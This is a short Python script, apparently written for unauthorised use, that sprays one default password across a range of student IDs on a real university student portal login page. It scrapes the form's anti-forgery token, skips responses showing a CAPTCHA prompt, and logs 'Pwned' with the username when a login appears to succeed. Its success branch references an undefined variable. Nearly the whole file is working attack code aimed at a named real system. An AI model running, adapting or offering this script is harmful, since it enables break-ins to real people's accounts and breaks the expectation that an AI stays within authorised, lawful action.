from requests import *
from pwn import log

URL             = 'https://student.must.edu.mn/Login'
SESSION         = session()
DATA            = SESSION.get(URL)
FORMTOKEN       = DATA.text
INDEX           = FORMTOKEN.find('__RequestVerificationToken')
FORMTOKEN       = FORMTOKEN[INDEX+49:INDEX+157]

log.success(f'Form   Token: {FORMTOKEN}')

headers = {
    'Referer': URL
}

BASE_TARGET     = 'B2009700'
DEFAULT_PASSWORD= 'DEFAULTPASSWORD123'

for _ in range(10, 100):
    username = BASE_TARGET + str(_)
    data = {
        'username': username,
        'password': DEFAULT_PASSWORD,
        '__RequestVerificationToken': FORMTOKEN,
        'returnUrl': '',
    }
    resp = SESSION.post(URL, data, headers=headers).text

    if 'Зурган кодыг оруулна уу' in resp:
        # start new session
        continue
    elif 'Оюутны код эсвэл нууц үг буруу байна.' in resp:
        log.warn(f'No luck: {username}')
    else:
        log.success('====== Pwned ========')
        log.success(f'Username: {username}')
        log.success(f'Password: {password}')
        log.success('====== Pwned ========')
        print(resp)
        input()

